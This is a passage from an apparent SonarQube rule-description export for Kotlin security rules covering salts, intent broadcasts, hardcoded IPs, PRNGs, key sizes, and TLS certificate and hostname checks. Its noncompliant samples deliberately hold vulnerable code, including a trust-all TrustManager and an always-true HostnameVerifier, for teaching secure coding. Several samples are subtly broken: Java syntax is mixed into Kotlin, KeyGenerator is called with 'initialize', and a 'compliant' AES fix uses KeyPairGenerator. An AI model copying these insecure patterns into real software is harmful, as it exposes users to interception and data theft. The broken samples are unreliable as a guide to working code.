depending on the salt size. The shorter\nthe salt, the higher the collision probability. In any case, using longer, cryptographically secure salt should be preferred.</p>\n<h2>How to fix it in Java SE</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of hard-coded salts.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport javax.crypto.spec.PBEParameterSpec\n\nfun hash() {\n    val salt = \"salty\".toByteArray()\n    val cipherSpec = PBEParameterSpec(salt, 10000) // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport java.security.SecureRandom\nimport javax.crypto.spec.PBEParameterSpec\n\nfun hash() {\n    val random = SecureRandom()\n    val salt = ByteArray(16)\n    random.nextBytes(salt)\n    val cipherSpec = PBEParameterSpec(salt, 10000)\n}\n</pre>\n<h3>How does this work?</h3>\n<p>This code ensures that each user’s password has a unique salt value associated with it. It generates a salt randomly and with a length that\nprovides the required security level. It uses a salt length of at least 16 bytes (128 bits), as recommended by industry standards.</p>\n<p>Here, the compliant code example ensures the salt is random and has a sufficient length by calling the <code>nextBytes</code> method from the\n<code>SecureRandom</code> class with a salt buffer of 16 bytes. This class implements a cryptographically secure pseudo-random number generator.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">OWASP</a> Top 10:2021 A02:2021 - Cryptographic Failures </li>\n  <li> <a href=\"https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">OWASP</a> - Top 10 2017 - A03:2017 - Sensitive Data\n  Exposure </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/759\">CWE</a> - CWE-759: Use of a One-Way Hash without a Salt </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/760\">CWE</a> - CWE-760: Use of a One-Way Hash with a Predictable Salt </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "kotlin:S5320": {
        "name": "Broadcasting intents is security-sensitive",
        "htmlDesc": "<p>In Android applications, broadcasting intents is security-sensitive. For example, it has led in the past to the following vulnerability:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9489\">CVE-2018-9489</a> </li>\n</ul>\n<p>By default, broadcasted intents are visible to every application, exposing all sensitive information they contain.</p>\n<p>This rule raises an issue when an intent is broadcasted without specifying any \"receiver permission\".</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The intent contains sensitive information. </li>\n  <li> Intent reception is not restricted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Restrict the access to broadcasted intents. See <a\nhref=\"https://developer.android.com/guide/components/broadcasts.html#restricting_broadcasts_with_permissions\">Android documentation</a> for more\ninformation.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nimport android.content.BroadcastReceiver\nimport android.content.Context\nimport android.content.Intent\nimport android.os.Bundle\nimport android.os.Handler\nimport android.os.UserHandle\n\npublic class MyIntentBroadcast {\n    fun broadcast(intent: Intent,\n                  context: Context,\n                  user: UserHandle,\n                  resultReceiver: BroadcastReceiver,\n                  scheduler: Handler,\n                  initialCode: Int,\n                  initialData: String,\n                  initialExtras: Bundle,\n                  broadcastPermission: String) {\n        context.sendBroadcast(intent) // Sensitive\n        context.sendBroadcastAsUser(intent, user) // Sensitive\n\n        // Broadcasting intent with \"null\" for receiverPermission\n        context.sendBroadcast(intent, null) // Sensitive\n        context.sendBroadcastAsUser(intent, user, null) // Sensitive\n        context.sendOrderedBroadcast(intent, null) // Sensitive\n        context.sendOrderedBroadcastAsUser(intent, user, null, resultReceiver,\n            scheduler, initialCode, initialData, initialExtras) // Sensitive\n    }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nimport android.content.BroadcastReceiver\nimport android.content.Context\nimport android.content.Intent\nimport android.os.Bundle\nimport android.os.Handler\nimport android.os.UserHandle\n\npublic class MyIntentBroadcast {\n    fun broadcast(intent: Intent,\n                  context: Context,\n                  user: UserHandle,\n                  resultReceiver: BroadcastReceiver,\n                  scheduler: Handler,\n                  initialCode: Int,\n                  initialData: String,\n                  initialExtras: Bundle,\n                  broadcastPermission: String) {\n\n        context.sendBroadcast(intent, broadcastPermission)\n        context.sendBroadcastAsUser(intent, user, broadcastPermission)\n        context.sendOrderedBroadcast(intent, broadcastPermission)\n        context.sendOrderedBroadcastAsUser(intent, user,broadcastPermission, resultReceiver,\n            scheduler, initialCode, initialData, initialExtras)\n    }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">OWASP Top 10 2021 Category A4</a> - Insecure Design </li>\n  <li> <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x11-v6-interaction_with_the_environment\">Mobile AppSec Verification\n  Standard</a> - Platform Interaction Requirements </li>\n  <li> <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m1-improper-platform-usage\">OWASP Mobile Top 10 2016 Category M1</a> - Improper\n  Platform Usage </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/927\">MITRE, CWE-927</a> - Use of Implicit Intent for Sensitive Communication </li>\n  <li> <a href=\"https://developer.android.com/guide/components/broadcasts.html#restricting_broadcasts_with_permissions\">Android documentation</a> -\n  Broadcast Overview - Security considerations and best practices </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "kotlin:S1313": {
        "name": "Using hardcoded IP addresses is security-sensitive",
        "htmlDesc": "<p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901\">CVE-2006-5901</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725\">CVE-2005-3725</a> </li>\n</ul>\n<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always\nhave the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,\ndelivery, and deployment:</p>\n<ul>\n  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>\n  <li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li>\n</ul>\n<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially\nsensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to\nbypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which\nwill increase an attack’s impact.</p>\n<h2>Ask Yourself Whether</h2>\n<p>The disclosed IP address is sensitive, e.g.:</p>\n<ul>\n  <li> Can give information to an attacker about the network topology. </li>\n  <li> It’s a personal (assigned to an identifiable person) IP address. </li>\n</ul>\n<p>There is a risk if you answered yes to any of these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar\napproach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having\nto rebuild the software.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nval ip = \"192.168.12.42\"\nval socket = ServerSocket(ip, 6667)\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nval ip = System.getenv(\"myapplication.ip\")\nval socket = ServerSocket(ip, 6667)\n</pre>\n<h2>Exceptions</h2>\n<p>No issue is reported for the following cases because they are not considered sensitive:</p>\n<ul>\n  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>\n  <li> Broadcast address 255.255.255.255 </li>\n  <li> Non-routable address 0.0.0.0 </li>\n  <li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href=\"http://www.oid-info.com/introduction.htm\">often match\n  Object Identifiers</a> (OID) </li>\n  <li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a\n  href=\"https://datatracker.ietf.org/doc/html/rfc5737\">RFC 5737</a> </li>\n  <li> Addresses in the range 2001:db8::/32, reserved for documentation purposes by <a href=\"https://datatracker.ietf.org/doc/html/rfc3849\">RFC\n  3849</a> </li>\n  <li> Addresses from ::ffff:0:127.0.0.1 to ::ffff:0:127.255.255.255 and from ::ffff:127.0.0.1 to ::ffff:127.255.255.255, which are local IPv4-mapped\n  IPv6 addresses </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li>\n  <li> <a href=\"https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data\n  Exposure </li>\n</ul>",
        "severity": "MINOR"
      },
      "kotlin:S2245": {
        "name": "Using pseudorandom number generators (PRNGs) is security-sensitive",
        "htmlDesc": "<p>Using pseudorandom number generators (PRNGs) is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-6386\">CVE-2013-6386</a> </li>\n  <li> <a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3419\">CVE-2006-3419</a> </li>\n  <li> <a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4102\">CVE-2008-4102</a> </li>\n</ul>\n<p>When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that\nwill be generated, and use this guess to impersonate another user or access sensitive information.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the code using the generated value requires it to be unpredictable. It is the case for all encryption mechanisms or when a secret value, such\n  as a password, is hashed. </li>\n  <li> the function you use generates a value which can be predicted (pseudo-random). </li>\n  <li> the generated value is used multiple times. </li>\n  <li> an attacker can access the generated value. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Only use random number generators which are <a\n  href=\"https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#secure-random-number-generation\">recommended by\n  OWASP</a> or any other trusted organization. </li>\n  <li> Use the generated random values only once. </li>\n  <li> You should not expose the generated random value. If you have to store it, make sure that the database or file is secure. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nval random = Random() // Noncompliant: Random() is not a secure random number generaotr\nval bytes = ByteArray(20)\nrandom.nextBytes(bytes)\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nval random = SecureRandom() // Compliant\nval bytes = ByteArray(20)\nrandom.nextBytes(bytes)\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li>\n  <li> <a href=\"https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data\n  Exposure </li>\n  <li> <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements\">Mobile AppSec\n  Verification Standard</a> - Cryptography Requirements </li>\n  <li> <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">OWASP Mobile Top 10 2016 Category M5</a> -\n  Insufficient Cryptography </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/338\">MITRE, CWE-338</a> - Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)\n  </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/330\">MITRE, CWE-330</a> - Use of Insufficiently Random Values </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/326\">MITRE, CWE-326</a> - Inadequate Encryption Strength </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/1241\">MITRE, CWE-1241</a> - Use of Predictable Algorithm in Random Number Generator </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#PREDICTABLE_RANDOM\">Predictable Pseudo Random Number\n  Generator</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "kotlin:S4426": {
        "name": "Cryptographic keys should be robust",
        "htmlDesc": "<p>This vulnerability exposes encrypted data to attacks whose goal is to recover the plaintext.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used\nfor several important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>In today’s cryptography, the length of the <strong>key</strong> directly affects the security level of cryptographic algorithms.</p>\n<p>Note that depending on the algorithm, the term <strong>key</strong> refers to a different mathematical property. For example:</p>\n<ul>\n  <li> For RSA, the key is the product of two large prime numbers, also called the <strong>modulus</strong>. </li>\n  <li> For AES and Elliptic Curve Cryptography (ECC), the key is only a sequence of randomly generated bytes.\n    <ul>\n      <li> In some cases, AES keys are derived from a master key or a passphrase using a Key Derivation Function (KDF) like PBKDF2 (Password-Based Key\n      Derivation Function 2) </li>\n    </ul>  </li>\n</ul>\n<p>If an application uses a key that is considered short and <strong>insecure</strong>, the encrypted data is exposed to attacks aimed at getting at\nthe plaintext.</p>\n<p>In general, it is best practice to expect a breach: that a user or organization with malicious intent will perform cryptographic attacks on this\ndata after obtaining it by other means.</p>\n<h3>What is the potential impact?</h3>\n<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that\nencryption was supposed to protect.</p>\n<p>Depending on the recovered data, the impact may vary.</p>\n<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can\nfurther exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a\nthird party to modify them under normal circumstances.</p>\n<h4>Breach of confidentiality and privacy</h4>\n<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,\nfinancial loss, reputational damage, or unauthorized access to confidential systems.</p>\n<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>\n<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and\nstakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>\n<h4>Legal and compliance issues</h4>\n<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the\nplaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>\n<h2>How to fix it in Java Cryptographic Extension</h2>\n<h3>Code examples</h3>\n<p>The following code examples either explicitly or implicitly generate keys. Note that there are differences in the size of the keys depending on the\nalgorithm.</p>\n<p>Due to the mathematical properties of the algorithms, the security requirements for the key size vary depending on the algorithm.<br> For example,\na 256-bit ECC key provides about the same level of security as a 3072-bit RSA key and a 128-bit symmetric key.</p>\n<h4>Noncompliant code example</h4>\n<p>Here is an example of a private key generation with RSA:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport java.security.KeyPairGenerator;\nimport java.security.NoSuchAlgorithmException;\n\nfun main(args: Array&lt;String&gt;) {\n    try {\n        val keyPairGenerator = KeyPairGenerator.getInstance(\"RSA\");\n        keyPairGenerator.initialize(1024); // Noncompliant\n\n    } catch (e: NoSuchAlgorithmException) {\n        // ...\n    }\n}\n</pre>\n<p>Here is an example of a private key generation with AES:</p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nimport java.security.KeyGenerator;\nimport java.security.NoSuchAlgorithmException;\n\nfun main(args: Array&lt;String&gt;) {\n    try {\n        val keyGenerator = KeyGenerator.getInstance(\"AES\");\n        keyGenerator.initialize(64); // Noncompliant\n\n    } catch (e: NoSuchAlgorithmException) {\n        // ...\n    }\n}\n</pre>\n<p>Here is an example of an Elliptic Curve (EC) initialization. It implicitly generates a private key whose size is indicated in the algorithm\nname:</p>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\nimport java.security.KeyPairGenerator;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.InvalidAlgorithmParameterException;\nimport java.security.spec.ECGenParameterSpec;\n\nfun main(args: Array&lt;String&gt;) {\n    try {\n        val keyPairGenerator  = KeyPairGenerator.getInstance(\"EC\");\n        val ellipticCurveName = new ECGenParameterSpec(\"secp112r1\"); // Noncompliant\n        keyPairGenerator.initialize(ellipticCurveName);\n\n    } catch (e: NoSuchAlgorithmException) {\n        // ...\n    } catch (e: InvalidAlgorithmParameterException) {\n        // ...\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport java.security.KeyPairGenerator;\nimport java.security.NoSuchAlgorithmException;\n\nfun main(args: Array&lt;String&gt;) {\n    try {\n        val keyPairGenerator = KeyPairGenerator.getInstance(\"RSA\");\n        keyPairGenerator.initialize(2048);\n\n    } catch (e: NoSuchAlgorithmException) {\n        // ...\n    }\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nimport java.security.KeyPairGenerator;\nimport java.security.NoSuchAlgorithmException;\n\npublic static void main(String[] args) {\n    try {\n        val keyPairGenerator = KeyPairGenerator.getInstance(\"AES\");\n        keyPairGenerator.initialize(128);\n\n    } catch (e: NoSuchAlgorithmException) {\n        // ...\n    }\n}\n</pre>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\nimport java.security.KeyPairGenerator;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.InvalidAlgorithmParameterException;\nimport java.security.spec.ECGenParameterSpec;\n\npublic static void main(String[] args) {\n    try {\n        val keyPairGenerator  = KeyPairGenerator.getInstance(\"EC\");\n        val ellipticCurveName = new ECGenParameterSpec(\"secp256r1\");\n        keyPairGenerator.initialize(ellipticCurveName);\n\n    } catch (e: NoSuchAlgorithmException) {\n        // ...\n    } catch (e: InvalidAlgorithmParameterException) {\n        // ...\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic community.</p>\n<p>The appropriate choices are the following.</p>\n<h4>RSA (Rivest-Shamir-Adleman) and DSA (Digital Signature Algorithm)</h4>\n<p>The security of these algorithms depends on the difficulty of attacks attempting to solve their underlying mathematical problem.</p>\n<p>In general, a minimum key size of <strong>2048</strong> bits is recommended for both.</p>\n<h4>AES (Advanced Encryption Standard)</h4>\n<p>AES supports three key sizes: 128 bits, 192 bits and 256 bits. The security of the AES algorithm is based on the computational complexity of trying\nall possible keys.<br> A larger key size increases the number of possible keys and makes exhaustive search attacks computationally infeasible.\nTherefore, a 256-bit key provides a higher level of security than a 128-bit or 192-bit key.</p>\n<p>Currently, a minimum key size of <strong>128 bits</strong> is recommended for AES.</p>\n<h4>Elliptic Curve Cryptography (ECC)</h4>\n<p>Elliptic curve cryptography is also used in various algorithms, such as ECDSA, ECDH, or ECMQV. The length of keys generated with elliptic curve\nalgorithms are mentioned directly in their names. For example, <code>secp256k1</code> generates a 256-bits long private key.</p>\n<p>Currently, a minimum key size of <strong>224 bits</strong> is recommended for EC algorithms.</p>\n<h3>Going the extra mile</h3>\n<h4>Pre-Quantum Cryptography</h4>\n<p>Encrypted data and communications recorded today could be decrypted in the future by an attack from a quantum computer.<br> It is important to keep\nin mind that NIST-approved digital signature schemes, key agreement, and key transport may need to be replaced with secure quantum-resistant (or\n\"post-quantum\") counterpart.</p>\n<p>Thus, if data is to remain secure beyond 2030, proactive measures should be taken now to ensure its safety.</p>\n<p><a href=\"https://www.enisa.europa.eu/publications/post-quantum-cryptography-current-state-and-quantum-mitigation\">Learn more here</a>.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode\">Microsoft, Timing vulnerabilities with CBC-mode\n  symmetric decryption using padding</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Padding_oracle_attack\">Wikipedia, Padding Oracle Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-ciphertext_attack\">Wikipedia, Chosen-Ciphertext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-plaintext_attack\">Wikipedia, Chosen-Plaintext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Semantic_security\">Wikipedia, Semantically Secure Cryptosystems</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding\">Wikipedia, OAEP</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Galois/Counter_Mode\">Wikipedia, Galois/Counter Mode</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li>\n  <li> <a href=\"https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data\n  Exposure </li>\n  <li> <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n  <li> <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements\">Mobile AppSec\n  Verification Standard</a> - Cryptography Requirements </li>\n  <li> <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">OWASP Mobile Top 10 2016 Category M5</a> -\n  Insufficient Cryptography </li>\n  <li> <a href=\"https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf\">NIST 800-131A</a> - Recommendation for Transitioning the\n  Use of Cryptographic Algorithms and Key Lengths* <a href=\"https://cwe.mitre.org/data/definitions/326\">MITRE, CWE-326</a> - Inadequate Encryption\n  Strength </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/327\">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/hDdGBQ\">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "kotlin:S4830": {
        "name": "Server certificates should be verified during SSL/TLS connections",
        "htmlDesc": "<p>This vulnerability makes it possible that an encrypted communication is intercepted.</p>\n<h2>Why is this an issue?</h2>\n<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them. The role\nof certificate validation in this process is to ensure that a system is indeed the one it claims to be, adding an extra layer of trust and\nsecurity.</p>\n<p>When certificate validation is disabled, the client skips this critical check. This creates an opportunity for attackers to pose as a trusted\nentity and intercept, manipulate, or steal the data being transmitted.</p>\n<h3>What is the potential impact?</h3>\n<p>Establishing trust in a secure way is a non-trivial task. When you disable certificate validation, you are removing a key mechanism designed to\nbuild this trust in internet communication, opening your system up to a number of potential threats.</p>\n<h4>Identity spoofing</h4>\n<p>If a system does not validate certificates, it cannot confirm the identity of the other party involved in the communication. An attacker can\nexploit this by creating a fake server and masquerading it as a legitimate one. For example, they might set up a server that looks like your bank’s\nserver, tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect\nany data your system sends to them, potentially leading to significant data breaches.</p>\n<h4>Loss of data integrity</h4>\n<p>When TLS certificate validation is disabled, the integrity of the data you send and receive cannot be guaranteed. An attacker could modify the data\nin transit, and you would have no way of knowing. This could range from subtle manipulations of the data you receive to the injection of malicious\ncode or malware into your system. The consequences of such breaches of data integrity can be severe, depending on the nature of the data and the\nsystem.</p>\n<h2>How to fix it in Java Cryptographic Extension</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of disabled certificate validation.</p>\n<p>The certificate validation gets disabled by overriding <code>X509TrustManager</code> with an empty implementation. It is highly recommended to use\nthe original implementation.</p>\n<h4>Noncompliant code example</h4>\n<pre>\nval trustAllCerts = arrayOf&lt;TrustManager&gt;(object : X509TrustManager {\n  @Throws(CertificateException::class)\n  override fun checkClientTrusted(chain: Array&lt;java.security.cert.X509Certificate&gt;, authType: String) {\n  } // Noncompliant\n\n  @Throws(CertificateException::class)\n  override fun checkServerTrusted(chain: Array&lt;java.security.cert.X509Certificate&gt;, authType: String) {\n  } // Noncompliant\n\n  override fun getAcceptedIssuers(): Array&lt;java.security.cert.X509Certificate&gt; {\n   return arrayOf()\n  }\n})\n</pre>\n<h3>How does this work?</h3>\n<p>Addressing the vulnerability of disabled TLS certificate validation primarily involves re-enabling the default validation.</p>\n<p>To avoid running into problems with invalid certificates, consider the following sections.</p>\n<h4>Using trusted certificates</h4>\n<p>If possible, always use a certificate issued by a well-known, trusted CA for your server. Most programming environments come with a predefined list\nof trusted root CAs, and certificates issued by these authorities are validated automatically. This is the best practice, and it requires no\nadditional code or configuration.</p>\n<h4>Working with self-signed certificates or non-standard CAs</h4>\n<p>In some cases, you might need to work with a server using a self-signed certificate, or a certificate issued by a CA not included in your trusted\nroots. Rather than disabling certificate validation in your code, you can add the necessary certificates to your trust store.</p>\n<p>Here is a sample command to import a certificate to the Java trust store:</p>\n<pre>\nkeytool -import -alias myserver -file myserver.crt -keystore cacerts\n</pre>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li>\n  <li> <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li>\n  <li> <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">OWASP Top 10 2021 Category A7</a> - Identification and\n  Authentication Failures </li>\n  <li> <a href=\"https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data\n  Exposure </li>\n  <li> <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n  <li> <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication\">OWASP Mobile Top 10 2016 Category M3</a> - Insecure\n  Communication </li>\n  <li> <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements\">Mobile AppSec Verification\n  Standard</a> - Network Communication Requirements </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/295\">MITRE, CWE-295</a> - Improper Certificate Validation </li>\n  <li> <a\n  href=\"https://wiki.sei.cmu.edu/confluence/display/java/MSC61-J.+Do+not+use+insecure+or+weak+cryptographic+algorithms\">https://wiki.sei.cmu.edu/confluence/display/java/MSC61-J.+Do+not+use+insecure+or+weak+cryptographic+algorithms</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "kotlin:S5527": {
        "name": "Server hostnames should be verified during SSL/TLS connections",
        "htmlDesc": "<p>This vulnerability allows attackers to impersonate a trusted host.</p>\n<h2>Why is this an issue?</h2>\n<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them. In this\nprocess, the role of hostname validation, combined with certificate validation, is to ensure that a system is indeed the one it claims to be, adding\nan extra layer of trust and security.</p>\n<p>When hostname validation is disabled, the client skips this critical check. This creates an opportunity for attackers to pose as a trusted entity\nand intercept, manipulate, or steal the data being transmitted.</p>\n<p>To do so, an attacker would obtain a valid certificate authenticating <code>example.com</code>, serve it using a different hostname, and the\napplication code would still accept it.</p>\n<h3>What is the potential impact?</h3>\n<p>Establishing trust in a secure way is a non-trivial task. When you disable hostname validation, you are removing a key mechanism designed to build\nthis trust in internet communication, opening your system up to a number of potential threats.</p>\n<h4>Identity spoofing</h4>\n<p>If a system does not validate hostnames, it cannot confirm the identity of the other party involved in the communication. An attacker can exploit\nthis by creating a fake server and masquerading it as a legitimate one. For example, they might set up a server that looks like your bank’s server,\ntricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect any data\nyour system sends to them, potentially leading to significant data breaches.</p>\n<h2>How to fix it in OkHttp</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of disabled hostname validation.</p>\n<p>The hostname validation gets disabled by overriding <code>javax.net.ssl.HostnameVerifier.verify()</code> with an empty implementation. It is highly\nrecommended to use the original implementation.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport javax.net.ssl.HttpsURLConnection\nimport javax.net.ssl.SSLSession\nimport javax.net.ssl.HostnameVerifier\nimport okhttp3.OkHttpClient\nimport okhttp3.Request\nimport okhttp3.Response\n\nfun request() {\n    val builder = OkHttpClient.Builder()\n    builder.hostnameVerifier(object : HostnameVerifier {\n      override fun verify(hostname: String?, session: SSLSession?): Boolean { // Noncompliant\n        return true\n      }\n    })\n\n    OkHttpClient client = builder.build()\n\n    Request request = new Request.Builder()\n            .url(\"https://example.com\")\n            .build()\n\n    Response response = client.newCall(request).execute()\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport 